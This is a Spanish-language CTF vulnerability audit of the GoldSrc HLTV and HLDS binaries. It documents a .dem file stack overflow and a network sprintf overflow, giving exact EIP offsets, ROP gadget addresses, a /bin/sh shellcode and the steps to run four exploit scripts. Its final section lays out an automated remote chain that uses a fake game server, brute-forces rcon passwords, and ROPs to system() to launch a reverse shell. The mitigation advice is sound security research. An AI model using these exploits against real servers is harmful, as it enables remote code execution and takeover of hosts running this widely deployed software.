# MEMORIA DE AUDITORÍA CTF — HLDS / GoldSrc (hltv, hlds_linux y módulos)

**Objetivo:** búsqueda de vulnerabilidades por ingeniería inversa estática, fáciles de explotar, sobre los binarios entregados (sin consultar recursos externos: todo hallazgo, offset y dirección proviene del análisis de los propios archivos).

**Alcance analizado:**

| Archivo | Tipo | Tamaño | Rol identificado |
|---|---|---|---|
| `hlds_linux` | ELF 32-bit EXEC (i386) | 54 KB | Ejecutable del servidor dedicado (carga `engine_i486.so`) |
| `hltv` | ELF 32-bit EXEC (i386) | 74 KB | Ejecutable del proxy HLTV (carga `core.so`, `proxy.so`, `demoplayer.so`) |
| `engine_i486.so` | ELF 32-bit DYN (i386, TEXTREL) | 1.3 MB | Motor GoldSrc (red, consola, ejecución de comandos) |
| `core.so` | ELF 32-bit DYN (i386, TEXTREL) | 463 KB | Módulo HLTV **Server** (conexión al servidor de juego, replay de demos, bzip2) |
| `proxy.so` | ELF 32-bit DYN (i386, TEXTREL) | 424 KB | Módulo HLTV **Proxy/Director** (espectadores, comandos, bzip2) |
| `demoplayer.so` | ELF 32-bit DYN (i386) | 144 KB | Módulo **DemoPlayer** (reproducción de `.dem`) |
| `filesystem_stdio.so` | ELF 32-bit DYN (i386) | 132 KB | Capa de sistema de archivos |
| `reunion.cfg` | Texto ASCII | 6.8 KB | Configuración del plugin ReUnion (ninguno de los binarios lo referencia: 0 menciones en `strings`; es material de apoyo del reto, no superficie de ataque de estos binarios) |

Todos los binarios están **sin strip** (símbolos completos, C++ demanglable con `nm -C`), lo que permitió análisis dirigido por nombre de función.

---

## 1. Metodología

1. **Inventario y mitigaciones** (`file`, `readelf -l/-d/-r`, `nm -D`): arquitectura, tipo, NX/PIE/RELRO/canarios, funciones peligrosas importadas.
2. **Caza sistemática**: barrido automatizado del desensamblado (`objdump -d -M intel`) localizando **todas** las llamadas a `strcpy/sprintf/strcat/vsprintf/memcpy` y asignándolas a su función contenedora real (fusionando bloques fríos `.L`/`.cold`/`.part`).
3. **Priorización por superficie**: funciones que consumen datos **de archivos** (`.dem`, BSP, cfg) o **de red** (mensajes del servidor de juego, stream HLTV).
4. **Ingeniería inversa dirigida** de cada candidato: tamaño del búfer destino, existencia de comprobaciones (`strncpy` acotado, `cmovbe`, comparaciones de longitud), ruta de datos hasta el parámetro atacable, y calculo del offset exacto hasta el EIP de retorno.
5. **Descarte documentado** de funciones aparentemente peligrosas pero correctamente acotadas (sección 6).
6. **Construcción de exploits** escalonados (crash → control de EIP → shellcode) y verificación estructural de los archivos generados.

---

## 2. Mitigaciones por binario (checksec)

| Binario | NX (GNU_STACK) | PIE | RELRO | Canarios (`__stack_chk_fail`) | Notas |
|---|---|---|---|---|---|
| `hlds_linux` | **RWE — pila EJECUTABLE** | No (EXEC @ 0x08048000) | Parcial | **No** | clásico GoldSrc |
| `hltv` | **RWE — pila EJECUTABLE** | No (EXEC @ 0x08048000) | Parcial | **No** | objetivo principal |
| `core.so` | RW (NX) | No (DYN + TEXTREL) | Parcial | **No** | la pila del proceso hereda RWE de `hltv` |
| `proxy.so` | RW (NX) | No (DYN + TEXTREL) | Parcial | **No** | idem |
| `demoplayer.so` | RW (NX) | No (DYN) | Parcial | **No** | idem |
| `engine_i486.so` | RW (NX) | No (DYN + TEXTREL) | Parcial | **No** | idem |
| `filesystem_stdio.so` | RW (NX) | No (DYN) | Parcial | **No** | idem |

Consecuencia clave: **ningún binario tiene canarios**, y como `hltv` declara `GNU_STACK` con flag `E`, todo el proceso `hltv` (incluidos los módulos `.so` con NX propio) corre con **pila ejecutable**. Una vez controlado EIP dentro de `hltv`, el shellcode puede ejecutarse directamente en la pila. Las direcciones de `hltv`/`hlds_linux` son fijas (no-PIE); los `.so` se mapean con ASLR del `mmap` (con ASLR desactivada, típico en CTF, sus gadgets son fijos).

---

## 3. VULN-01 (CRÍTICA — archivo → RCE): `DemoFile::ReadDemoPacket()` sin validar el tamaño de frame

- **Función:** `DemoFile::ReadDemoPacket(BitBuffer*, demo_info_s*)` — `core.so+0x36F40`
- **Vector:** archivo `.dem` reproducido en `hltv` con el comando de consola `playdemo <archivo>` (implementado en `Proxy::CMD_PlayDemo` @ `proxy.so+0x19180`; añade extensión `.dem` automáticamente y reproduce por la misma ruta de parseo del módulo Server).
- **Impacto:** desbordamiento de pila de hasta 64 KB con datos 100 % controlados → `pop ebx/esi/edi/ebp; ret` con valores del atacante → **ejecución de código arbitrario** en `hltv` (pila RWX) o, como mínimo, DoS remoto/local si solo se provoca el crash.
- **Severidad:** Crítica.

### 3.1 Código vulnerable (desensamblado de `core.so+0x36F40`, Intel)

Prólogo y reserva del búfer local de 64 KB:

```asm
00036f40 <_ZN8DemoFile14ReadDemoPacketEP9BitBufferP11demo_info_s>:
 36f40:  push   ebp
 36f41:  push   edi
 36f42:  push   esi
 36f43:  push   ebx
 36f44:  call   129f0 <__x86.get_pc_thunk.bx>
 36f49:  add    ebx,0x290b7
 36f4f:  sub    esp,0x1004c              ; marco de ~64KB: buffer local 0x10000
```

Lectura del frame (el orden exacto fue verificado instrucción a instrucción):

```asm
 36fe2:  push   DWORD PTR [ebp+0x6c8]    ; handle de fichero (IFileSystem*)
 36fe8:  push   0x1
 36fea:  push   DWORD PTR [esp+0x2c]     ; &tipo   (base+0x27)
 36fef:  call   DWORD PTR [edx+0x58]     ; Read(file, &tipo, 1)
 36ff5:  cmp    eax,0x1                  ; EOF -> sale (373b4)
 ...
 3700c:  push   0x4                      ; &tiempo (float, base+0x38)
 37013:  call   DWORD PTR [edx+0x58]     ; Read(file, &time, 4)
 3701b:  call   11af0 <_Z12_LittleFloatf@plt>
 3702f:  push   DWORD PTR [ebp+0x6c8]
 37035:  push   0x4                      ; &campoA (long, base+0x34)
 3703c:  call   DWORD PTR [edx+0x58]     ; Read(file, &campoA, 4)
```

Despacho por tipo de frame (tabla en `0x387A8`, tipos válidos 0–9) y **ruta vulnerable del tipo 9**:

```asm
 370a2:  cmp    BYTE PTR [esp+0x27],0x9  ; tipos > 9 -> error
 370ba:  mov    esi,DWORD PTR [ebx+eax*4-0x17858]  ; tabla de saltos
 ...
000370c8 <.L1716>  (frame tipo 9):
 370c8:  ...Read(file, &size, 4)          ; size = LittleLong LEIDO DEL FICHERO
 370f4:  test   eax,eax
 370f6:  jne    37170                    ; size != 0 -> leer 'size' bytes
 37170:  push   DWORD PTR [ebp+0x6c8]    ; file
 3717e:  push   ecx                      ; ecx = size SIN VALIDAR
 3717f:  lea    esi,[esp+0x48]           ; dest = base+0x40 (buffer de 0x10000)
 37185:  call   DWORD PTR [edx+0x58]     ; Read(file, buf, size)  <<< BUG
```

**No existe ninguna comparación de `size` contra la capacidad del búfer** (0x10000). Los tipos 6 y 7 usan tamaños fijos (0x54 y 8) y el tipo 8 deriva el tamaño de dos longs (`+0x10`), pero el **tipo 9 lee un entero de 32 bits arbitrario** y lo usa como longitud de lectura a pila.

Epílogo que materializa el control del flujo (`core.so+0x373BD`):

```asm
 373bd:  add    esp,0x1004c
 373c3:  pop    ebx                      ; 4 dwords del atacante
 373c4:  pop    esi
 373c5:  pop    edi
 373c6:  pop    ebp
 373c7:  ret                             ; EIP = 4 bytes del atacante
```

### 3.2 Geometría exacta del desbordamiento

Con base = `esp` tras el `sub esp,0x1004c`:

| Elemento | Dirección | Offset desde el inicio del buffer (`base+0x40`) |
|---|---|---|
| Buffer de datos del frame | `base+0x40` | 0 |
| Saved `ebx` | `base+0x1004C` | 65548 (0x1000C) |
| Saved `esi` | `base+0x10050` | 65552 (0x10010) |
| Saved `edi` | `base+0x10054` | 65556 (0x10014) |
| Saved `ebp` | `base+0x10058` | 65560 (0x10018) |
| **EIP de retorno** | `base+0x1005C` | **65564 (0x1001C)** |
| **Primer byte ejecutado tras `ret`** (`esp` apunta aquí) | `base+0x10060` | **65568 (0x10020)** |

Payload del frame tipo 9:

```
[ 09 ][ float tiempo ][ uint32 campoA ][ uint32 size ][ datos de 'size' bytes ]
                                                        |<- 65564 ->|<- EIP ->|<- sled+shellcode ->|
```

Al llegar a EOF, `Read` del siguiente tipo falla (`36ff5: cmp eax,1; jne 373b4`) y se alcanza el epílogo → `ret` al valor controlado.

### 3.3 Formato de fichero `.dem` (reconstruido por RE)

```
[ 436 bytes ]  cabecera demo_info_s   (DemoFile::ReadDemoInfo @ core.so+0x2F8C0: Read de 0x1B4 sin magic check)
[ 16 bytes  ]  secuencia              (DemoFile::ReadSequenceInfo @ core.so+0x2F910: 4 x ReadLong)
[ frames... ]  <tipo:u8><tiempo:f32><campoA:u32> ... según tipo
               tipo 9: <tipo=9><tiempo:f32><campoA:u32><size:u32><datos:size>
```

Los exploits generan cabecera con firma `HLDEMO\0`, versión 1 y protocolo 46 por compatibilidad, y bloque de secuencia a ceros.

---

## 4. VULN-02 (ALTA — red → RCE): `sprintf` sin límite en `Server::SetGameDirectory()`

- **Función:** `Server::SetGameDirectory(char const*, char const*)` — `core.so+0x13970`
- **Vector:** respuesta `svc_serverinfo` (id **0x0B**) de un servidor de juego al que `hltv` se conecta (comando `connect`). El handler `Server::ParseServerinfo()` @ `core.so+0x1CA00` extrae el `gamedir` del mensaje y lo pasa a `SetGameDirectory` mediante llamada virtual (`core.so+0x1CD62: call DWORD PTR [eax+0x9c]`; entrada confirmada por la reubicación `R_386_32 → 0x13970` en la vtable de `Server`).
- **Impacto:** desbordamiento de pila con control de EIP → RCE en `hltv` (mismas condiciones RWX que VULN-01) si la ruta de instalación (`basedir`) es suficientemente larga; DoS en cualquier caso.
- **Severidad:** Alta (requiere que la víctima se conecte a un servidor/hostil controlado o MITM del canal de juego).

### 4.1 Código vulnerable

```asm
00013970 <_ZN6Server16SetGameDirectoryEPKcS1_>:
 1398c:  sub    esp,0x134
 ...
 139ea:  lea    edi,[ebp-0x11c]          ; buffer local (284 bytes hasta saved regs)
 139f3:  push   eax
 139f4:  call   edx                      ; FileSystem::GetBaseDir()  (vtable+0xa0)
 139f6:  push   DWORD PTR [ebp-0x12c]    ; arg: gamedir remoto
 139fc:  push   eax                      ; arg: basedir
 139fd:  push   DWORD PTR [ebp-0x130]    ; formato "%s/%s"
 13a03:  push   edi
 13a04:  call   11830 <sprintf@plt>      ; sprintf(buf, "%s/%s", basedir, gamedir)
```

La rama alternativa (gamedir distinto del actual, `core.so+0x13A68..13A84`) repite el mismo patrón con el segundo argumento. **No hay `snprintf` ni comprobación de longitud.**

### 4.2 Límite aguas arriba y condición de explotación

`ParseServerinfo` acota cada string del mensaje a 259 caracteres (`strncpy` con `0x103` en `0x1CBEC`, `0x1CC19`, `0x1CC43`), pero la concatenación es la que desborda:

```
len(basedir) + 1 + len(gamedir)  vs  buffer 284 bytes ; EIP a 288
```

* Con `gamedir` máximo (259) basta `basedir ≥ 28` caracteres (p. ej. `/home/usuario/torneo/hltv`) para alcanzar el EIP guardado.
* Con rutas cortas el desbordamiento alcanza registros salvados/`saved ebp` (corrupción y crash garantizados aunque no control limpio de EIP).

### 4.3 Tabla de mensajes del protocolo (decodificada de `Server::m_ClientFuncs` @ `core.so+0x60680`)

Los punteros de la tabla están codificados en el fichero y se resuelven mediante reubicaciones `R_386_32`. Mapeo completo obtenido (extracto relevante para el CTF):

| svc | Handler | | svc | Handler |
|---|---|---|---|---|
| 0x00 | `Server::ParseBad` | | 0x09 | **`Server::ParseStuffText`** |
| 0x02 | `Server::ParseDisconnect` | | 0x0B | **`Server::ParseServerinfo`** ← VULN-02 |
| 0x04 | `Server::ParseVersion` | | 0x24 | `Server::ParseDecalName` |
| 0x08 | `Server::ParsePrint` | | 0x33 | `Server::ParseDirector` |

(`ParseStuffText` @ `core.so+0x2D4C0` fue auditado: usa `TokenLine`, acotado — sección 6.)

---

## 5. HALLAZGO-03 (MEDIA — defecto latente en API pública): `strcpy` sin límite en accesores `DirectorCmd::Get*Data()`

En `core.so` y `demoplayer.so` (duplicados del mismo código):

| Función | core.so | demoplayer.so | Defecto |
|---|---|---|---|
| `DirectorCmd::GetSoundData(char*, float&)` | `0x35470` | `0xE8B0` | `strcpy(out, m_data.ReadString())` sin límite |
| `DirectorCmd::GetMessageData(..., char*)` | `0x354E0` | `0xEA00` | idem |
| `DirectorCmd::GetBannerData(char*)` | `0x355B0` | `0xEB40` | idem |
| `DirectorCmd::GetStuffTextData(char*)` | `0x35610` | `0xEBA0` | idem |

Ejemplo (`demoplayer.so+0xE8B0`):

```asm
  e8db:  lea    esi,[edx+0x10]
  e8df:  call   8260 <_ZN9BitBuffer5ResetEv@plt>
  e8e7:  call   8140 <_ZN9BitBuffer10ReadStringEv@plt>   ; longitud arbitraria
  e8ef:  push   eax
  e8f3:  call   8890 <strcpy@plt>                        ; dest sin tamano <<< BUG
```

El contenido proviene del búfer del comando director (`m_data`), alimentado por el stream de demo/HLTV. **En estos binarios no existe ningún llamador** (búsqueda por llamadas directas y reubicaciones: 0 resultados), por lo que son accesores para módulos externos/plugins. Cualquier consumidor futuro con búfer fijo hereda un RCE; se corrigen sustituyendo `strcpy` por `strncpy`/`snprintf` con el tamaño del destino.

---

## 6. Superficies auditadas y DESCARTADAS (código correctamente acotado)

Demonstrar el descarte es parte del trabajo; estas funciones contenían llamadas peligrosas pero resultaron seguras:

| Función | Dónde | Por qué es segura |
|---|---|---|
| `TokenLine::SetLine(char const*)` | `core.so+0x21BA0` | `strlen > 0x7FE` → rechaza; `strncpy(dst, src, 0x7FF)` + terminación manual |
| `COM_Parse(char*)` | `proxy.so+0x23AD0` | token acotado (`cmp ecx,0x3ff je` en comillas; `0x3fe` sin comillas) |
| `SV_ParseStringCommand(client_s*)` | `engine_i486.so+0x1FAB0` | build **parcheado**: rate-limiter (`CStringCommandsRateLimiter::StringCommandIssued`), truncado a 127 (`mov BYTE PTR [edi+0x7f],0x0`) y whitelist de comandos |
| `Cmd_Exec_f()` | `engine_i486.so+0x5B6F0` | `Mem_Malloc(filesize+1)` dinámico + límite del buffer de comandos antes de insertar |
| `BuildCmdLine(int, char**)` | `hlds_linux+0x804A410` | clamp con `cmovbe` a `0x801` y error "cmd line too long" |
| `System::ExecuteFile(char*)` | `hltv+0x804D430` | `ReadLine(f, buf, 0xFF)` acotado |
| `ProxyClient::ProcessStringCmd(char*)` | `proxy.so+0x11430` (cuerpo `0x204D0`) | usa `TokenLine` (acotado) |
| `CSys::ConsoleInput` / consola `hlds_linux` | `hlds_linux+0x804A8D0` | `read` de 1 byte + `snprintf(buf, 0x100, "%s", ...)` |
| `CBaseFileSystem::GetLocalPath` | `filesystem_stdio.so+0x9510` | reserva dinámica con `alloca` según `strlen` |
| `DemoPlayer::ReadDemoMessage(uchar*,int)` | `demoplayer.so+0x12340` | `memcpy` acotado por parámetro de capacidad |
| `DirectorCmd::ReadFromStream(BitBuffer*)` | `demoplayer.so+0x13CB0` | `BitBuffer::Resize(strlen+1)` dinámico |

Nota residual: `CTextConsoleUnix::GetLine()` (`hltv+0x804F120`, máquina de estados VT100) contiene 2 `strcpy` internos (eco de historial y devolución de línea). El bucle de lectura es byte a byte y los búferes de edición/historial comparten tamaño en el estado normal; no se identificó desbordamiento alcanzable en el análisis estático, pero por complejidad del autómata se recomienda revisión dinámica (fuzzing de entrada de consola con secuencias de escape).

---

## 7. Gadgets y primitivas útiles

| Primitiva | Dirección | Uso |
|---|---|---|
| `jmp esp` | `engine_i486.so+0x5356D` | EIP → ejecuta el payload pegado al EIP guardado (offset 65568). Requiere base de carga del módulo (fija si ASLR off) |
| `push esp; ret` | `core.so+0x2E584` (y `0x2E816`) | equivalente de salto a pila |
| `push esp; ret` | `proxy.so+0x2BB24`, `filesystem_stdio.so+0x697A` | alternativas |
| Pila RWX del proceso | `GNU_STACK RWE` de `hltv` | el shellcode se ejecuta en la propia pila |
| Shellcode incluido | 23 bytes | `execve("/bin/sh", ["/bin/sh"], NULL)` x86/Linux, sin bytes NUL |

Con ASLR activa: sled de NOPs (8 KB por defecto en el exploit 3) + reintento; con ASLR desactivada (`setarch -R ./hltv`), explotación determinista con la base de los módulos leída de `/proc/<pid>/maps`.

---

## 8. Los exploits (todos `input()` puro, sin `argv`, generan archivos)

| Script | Nivel | Qué genera | Cómo se usa |
|---|---|---|---|
| `exploit1_crash.py` | 1 — DoS | `ctf_crash.dem` (frame tipo 9 con `size` = 0x10020, EIP = 0x41414141) | `python3 exploit1_crash.py` → en `hltv`: `playdemo ctf_crash.dem` → SIGSEGV con EIP=0x41414141 |
| `exploit2_eip.py` | 2 — control de EIP | `ctf_eip.dem` con patrón cíclico (modo 1: medir offset; modo 2: EIP fijo; modo 3: localizar offset de un EIP capturado) | El patrón colocado desde el inicio del buffer hace que el EIP capturado sea la secuencia `"Gh91"`; el modo 3 la resuelve a **65564 (0x1001C)** y verifica el cálculo estático |
| `exploit3_shellcode.py` | 3 — RCE | `ctf_shell.dem` con `jmp esp`/`push esp;ret` o sled + `execve("/bin/sh")` | Pide estrategia y dirección (base de `engine_i486.so`, de `core.so` o dirección del sled) |
| `exploit4_setgamedir.py` | bonus — VULN-02 | `payload_serverinfo.bin` (cuerpo del mensaje svc 0x0B con gamedir de 259) | Pide `basedir` y advierte si la condición `len(basedir)+1+len(gamedir) ≥ 288` se cumple |

Verificación estructural realizada sobre los ficheros generados: tamaño total, tipo de frame, campo `size`, bytes exactos en el offset del EIP y presencia del sled tras el EIP (todo correcto; ver transcript en la sección de reproducción).

---

## 9. Reproducción paso a paso (entorno CTF)

```bash
# --- PoC 1: crash por archivo (.dem) --------------------------------------
python3 exploit1_crash.py            # respuestas: <ENTER> <ENTER>
#  -> ctf_crash.dem (66033 bytes)
./hltv                               # en el directorio del reto
playdemo ctf_crash.dem
dmesg | tail -3                      # hltv[...]: segfault ... ip 41414141
#  en gdb:  gdb ./hltv -> run -> playdemo ctf_crash.dem -> info registers eip

# --- PoC 2: control de EIP -------------------------------------------------
python3 exploit2_eip.py              # opcion 1 -> patron; el script avisa de
#  que el EIP contendra 'Gh91'
playdemo ctf_eip.dem                 # crash con EIP='Gh91' (0x31686847 LE)
python3 exploit2_eip.py              # opcion 3, secuencia 'Gh91'
#  -> "Offset del EIP ...: 65564 (0x1001C)  COINCIDE con el calculo estatico"

# --- PoC 3: shell ----------------------------------------------------------
python3 exploit3_shellcode.py        # estrategia 1; base de engine_i486.so
#  (con ASLR off: leer de /proc/$(pidof hltv)/maps)
playdemo ctf_shell.dem               # -> execve("/bin/sh") dentro de hltv

# --- PoC 4 (vector red, VULN-02) -------------------------------------------
python3 exploit4_setgamedir.py       # genera payload_serverinfo.bin
#  inyectar como respuesta svc 0x0B de un servidor de juego falso al que
#  hltv hace 'connect IP:PUERTO'
```

---

## 10. Impacto global y recomendaciones

**Impacto.** VULN-01 convierte un simple archivo `.dem` en la ruta completa de ejecución de código sobre el proceso HLTV (que habitualmente corre sin aislamiento en servidores de juego clásicos): el vector es realista tanto en CTF (`playdemo` de un archivo proporcionado) como en escenarios reales (demos compartidas, conexión a servidores maliciosos). VULN-02 otorga al servidor de juego al que el proxy se suscribe la capacidad de corromper la pila del cliente durante el handshake. El HALLAZGO-03 es una mina en la API pública. En conjunto: **RCE como usuario del servicio, movimiento lateral y persistencia** en la máquina anfitriona.

**Recomendaciones de mitigación** (en orden de eficacia):

1. Validar `size` en `DemoFile::ReadDemoPacket` contra la capacidad del búfer (y contra el tamaño restante del fichero) antes de `Read`; descartar frames con `size > 0x10000 - 0x40`.
2. Sustituir los dos `sprintf` de `Server::SetGameDirectory` por `snprintf(buf, sizeof(buf), "%s/%s", ...)` (el binario ya usa `snprintf` en `ParseServerinfo`, es un cambio trivial).
3. Reemplazar los `strcpy` de los accesores `DirectorCmd::Get*Data` por copias acotadas al tamaño del destino.
4. Compilar con `-fstack-protector-strong` y enlazar con `-z noexecstack` (elimina la pila RWX heredada del ejecutable) + `RELRO` completo; reubicar los módulos con `-fPIC` para habilitar ASLR pleno.
5. Operacionalmente: ejecutar `hltv` con usuario dedicado y sin privilegios; no reproducir demos de origen no confiable.

---

## 11. CADENA CTF AUTOMÁTICA CONTRA LA IP DEL LABORATORIO (`exploit_ctf_auto.py`)

Esta sección documenta la evolución de VULN-02 a un exploit **de red, desatendido y con corrección de modelo** del epílogo de `SetGameDirectory`, más todo el protocolo GoldSrc reconstruido desde los binarios (sin recursos externos).

### 11.1 Corrección importante: el punto de control real es `saved-ECX` (buf+268), no el EIP (buf+288)

El epílogo real de `Server::SetGameDirectory` (core.so+0x13A56) no es un epílogo estándar: el prólogo usa el patrón de alineación i386 (`lea ecx,[esp+4]` / `and esp,0xfffffff0` / `push [ecx-4]` / `push ecx`), y el epílogo lo deshace así:

```asm
13a56:  lea    esp,[ebp-0x10]
13a59:  pop    ecx          ; saved-ECX  <- buf+268 (269..272 de la cadena)
13a5a:  pop    ebx          ; buf+272
13a5b:  pop    esi          ; buf+276
13a5c:  pop    edi          ; buf+280
13a5d:  pop    ebp          ; buf+284
13a5e:  lea    esp,[ecx-0x4]; ESP := ECX-4   (ECX son bytes del atacante)
13a61:  ret                 ; EIP  := mem[ECX-4]
```

Consecuencias (verificadas desensamblando, no asumidas):

1. La escritura del `sprintf` es **contigua**: si la cadena alcanza buf+268, el `saved-ECX` **siempre** queda corrompido; el `ret` final nunca lee la ranura buf+288. El punto de control es **`ECX := dword en buf+268`** y `EIP := mem[ECX-4]`.
2. Basta `len(basedir)+1+len(gamedir) >= 272` para control total → **con `gamedir` de 259 basta `basedir >= 12`** (antes se calculaba 28/32 para el modelo antiguo; la condición real es más laxa).
3. `basedir` = `dirname(argv[0])` con `/` final: el objeto usado es el módulo `System` de `hltv` (comprobado en `System::Init`: `cmp [vtable+0xa0], System::GetBaseDir`), que copia una ruta global y trunca en el último `/`.
4. Como `EIP` sale de **memoria** (`mem[ECX-4]`), el truco clásico "EIP=jmp esp" no aplica: la técnica correcta es apuntar `ECX-4` **al buffer del mensaje en el heap**, donde nuestra propia cadena ROP espera (ver 11.4).

### 11.2 Protocolo de conexión reconstruido (hltv ↔ servidor de juego)

Extraído íntegramente de `core.so` / `engine_i486.so` (símbolos intactos):

| Paso | Dirección | Formato | Fuente RE |
|---|---|---|---|
| 1 | hltv → servidor | `FFFFFFFF "getchallenge\n"` (reintentos ≤3) | `Server::Challenge` (0x1B970) |
| 2 | servidor → hltv | `FFFFFFFF "<T>challenge <n> <x>\n"` con **token[0] empezando por '9' o '?'** y **≥3 tokens** | jump-table de `ProcessConnectionlessServerMessage` (0x1DD00): `'9'/'?' → Server::AcceptChallenge`; `AcceptChallenge` (0x1DBE0): `CountToken()>2`, `GetToken(1)`→challenge (**GetToken es 0-indexed**, 0x21D80) |
| 3 | hltv → servidor | `FFFFFFFF "connect <proto> <n> <userinfo>"` | `Server::SendConnectPacket` (0x1DF20) |
| 4 | servidor → hltv | **netchan**: `[seq:4][ack:4][payload MUNGEADO con clave seq&0xFF]`; bit30 de `seq` = fragmentos (0 = paquete único grande); bit31 debe ser 0 | `NetChannel::ProcessIncoming` (0x383A0): chequeo `-1`→connectionless, `COM_UnMunge2(buf+8, len-8, seq&0xFF)`, entrega no fragmentada en 0x38800 (paquete de 0x5C con `BitBuffer::Resize`+`WriteBuf`) |
| 5 | hltv (interno) | parseo svc: el **primer long del cuerpo debe ser 48** (`[Server+0x17a24]=0x30`, core.so+0x1B5A0) | `Server::ParseServerinfo` (0x1CA00) |

**MUNGE (COM_Munge2/UnMunge2, engine_i486.so+0x63460):** `mask = bswap32(~key) ^ key`; por cada dword de cada **bloque completo de 64 bytes** el receptor aplica `P = bswap32(W ^ mask ^ C[i])` (16 constantes `C[i]`, extraídas del binario); **la cola (<64 bytes) no se toca**. El cifrador aplica la inversa exacta: `W = bswap32(P) ^ mask ^ C[i]`.

**Layout del cuerpo svc_serverinfo (orden de lecturas verificado en 0x1CA6F..0x1CD62):**

```
[0x0B][long proto=48][long][long][16 bytes][byte][byte][byte]
[string gamedir ≤259][string][string][SkipString][byte=0]
```

La `gamedir` se copia con `strncpy(,0x103)` a un **local de `ParseServerinfo`** y se pasa como **arg2** a `SetGameDirectory` (llamada virtual `[vtable+0x9c]` en 0x1CD62, con arg1 = `"valve"` @ core.so+0x444EB). Tras el `sprintf` venenoso, el epílogo del punto 11.1 ejecuta el control.

### 11.3 Arsenal ROP de direcciones FIJAS en `hltv` (no-PIE 0x08048000, inmune a ASLR)

| Primitiva | Dirección | Uso en la cadena |
|---|---|---|
| `ret` | `0x0804900A` | sled de retorno (24 KB) en el heap |
| `pop edi; pop ebp; ret` | `0x080499CD` | saltar 2 argumentos |
| `pop edi; pop edi; pop ebp; ret` | `0x080499CC` | saltar 3 argumentos |
| `dlsym@plt` | `0x08049150` | `dlsym(RTLD_DEFAULT=0, "system")` |
| `call eax` | `0x08049019` | llamar al `&system` devuelto |
| `"system\0"` (rodata) | `0x0805122F` | nombre de símbolo para `dlsym` |
| buffer de comando | `0x08064100` | página final de `.bss` (0x08064004..0x08065000, libre) |
| `read@plt` | `0x080492F0` | `read(fd, CMD_BUF, 256)` sobre los fds de sockets de hltv |

La cadena completa: `read(fd,CMD_BUF,256)` para fd∈{4,5,3,6,7,8} (el comando llega por red en un datagrama; los `read` fallidos devuelven -1 y continúan) → `dlsym(0,"system")` → `call eax` → `system(CMD_BUF)` → one-liner multi-tool (`nc`/`busybox`/`python3`/`perl`) que lanza la shell inversa al atacante. **Ninguna dirección depende de módulos ni de libc**; la única incógnita es la posición del buffer del mensaje en el heap.

### 11.4 Estructura del payload y barrido automático

- `gamedir` (259) = `'A'*shift + p32(heap_guess) * N`: el dword que cae en buf+268 vale `heap_guess` siempre que `(267-len(basedir)) % 4 == shift`. **Barriendo shift=0..3 se cubre cualquier `basedir` ≥ 12 sin conocerlo** (los bytes `08 xx xx xx` no contienen 0x00, sobreviven a `sprintf`/`strncpy`).
- Tras los campos parseados viaja la **zona cruda** del mismo mensaje (el parser deja de leer, pero los bytes viven en el buffer del heap): `sled` de `ret` (24 KB) + cadena ROP (los 0x00 están permitidos aquí).
- Barrido: candidatos de `heap_guess` desde `0x08060008` con paso 12 KB (mitad del sled: cualquier posición real cae dentro) × 4 shifts × 2 layouts de entrega (A: `buf+8`; B: `buf+4`, donde el ack `0x00000004` se disfraza de `svc 0x04 ParseVersion` que absorbe el desfase). Cada intento fallido rompe `hltv`; el barrido continúa contra el servicio reiniciado.
- El disparador puede ser **rcon** (`rcon <pass> connect <atacante>:27015`, con mini-fuerza bruta de contraseñas integrada) o **pasivo** (si el `hltv` del laboratorio ya apunta al atacante).

### 11.5 Uso

```bash
python3 exploit_ctf_auto.py
# IP del laboratorio ............. 10.60.0.99
# Puerto rcon/proxy de hltv ...... 27020
# Puerto UDP de mi servidor falso  27015
# Mi IP alcanzable ............... (auto)
# Puerto de la shell inversa ..... 4444
# rcon_password .................. (ENTER = lista integrada) o vacío+pasivo
# ¿hltv ya apunta a mi IP? ....... s/N
```

El script integra: servidor de juego falso (challenge/connect/netchan+munge), listener de shell con reconocimiento automático (`id`, `uname`, `hostname`, `cat /flag*`), consola interactiva y el barrido completo. Requisitos: `hltv` debe reiniciarse tras cada crash (supervisor/docker), `basedir ≥ 12` caracteres (es decir, hltv lanzado con ruta, no `./hltv`), y Python 3 estándar en el atacante.

Pruebas locales incluidas (`scripts/test_auto.py`): round-trip munge, estructura del mensaje, aterrizaje del slot ECX para basedir 12..101, validez de la ROP, simulador de handshake completo y layout B. Todas en verde.
